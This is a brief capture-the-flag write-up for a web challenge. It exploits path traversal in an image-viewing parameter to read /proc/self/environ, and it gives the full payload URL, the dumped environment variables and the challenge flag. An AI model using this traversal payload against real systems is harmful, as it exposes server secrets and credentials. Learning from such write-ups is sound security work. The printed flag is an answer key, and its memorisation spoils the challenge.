---
ai_date: 2025-04-27 05:20:56
ai_summary: Challenge allows reading environment variables to obtain the flag
ai_tags:
  - proc-self-environ
  - env-var-read
  - rce
created: 2024-08-04T06:06
points: 429
solves: 212
updated: 2025-07-14T09:46
---

Very obvious hint indeed.

We can read the current process's environment variables via `/proc/self/environ`.

http://76cf1086-2c7a-4f07-82ae-1f0858e460c7.challs.n00bzunit3d.xyz:8080/view?image=../../../../../../../../../proc/self/environ

```
UEFUSD0vdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4ASE9TVE5BTUU9ODU5Y2Q5MTc2ZGQwAEZMQUc9bjAwYnp7VGgzXzNudjFyMG5tM250X2RldDNybWluZTVfNGgzX1MzbEZfN2M2N2ZjYWM5N2FhfQBMQU5HPUMuVVRGLTgAR1BHX0tFWT1BMDM1QzhDMTkyMTlCQTgyMUVDRUE4NkI2NEU2MjhGOEQ2ODQ2OTZEAFBZVEhPTl9WRVJTSU9OPTMuMTAuMTQAUFlUSE9OX1BJUF9WRVJTSU9OPTIzLjAuMQBQWVRIT05fU0VUVVBUT09MU19WRVJTSU9OPTY1LjUuMQBQWVRIT05fR0VUX1BJUF9VUkw9aHR0cHM6Ly9naXRodWIuY29tL3B5cGEvZ2V0LXBpcC9yYXcvNjZkOGEwZjYzNzA4M2UyYzNkZGZmYzBjYjFlNjVjZTEyNmFmYjg1Ni9wdWJsaWMvZ2V0LXBpcC5weQBQWVRIT05fR0VUX1BJUF9TSEEyNTY9NmZiN2I3ODEyMDYzNTZmNDVhZDc5ZWZiYjE5MzIyY2FhNmMyYTVhZDM5MDkyZDBkNDRkMGZlYzk0MTE3ZTExOABIT01FPS9ob21lL2NoYWxsAA==
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin�HOSTNAME=859cd9176dd0�FLAG=n00bz{Th3_3nv1r0nm3nt_det3rmine5_4h3_S3lF_7c67fcac97aa}�LANG=C.UTF-8�GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D�PYTHON_VERSION=3.10.14�PYTHON_PIP_VERSION=23.0.1�PYTHON_SETUPTOOLS_VERSION=65.5.1�PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py�PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118�HOME=/home/chall�
```

```flag
n00bz{Th3_3nv1r0nm3nt_det3rmine5_4h3_S3lF_7c67fcac97aa}
```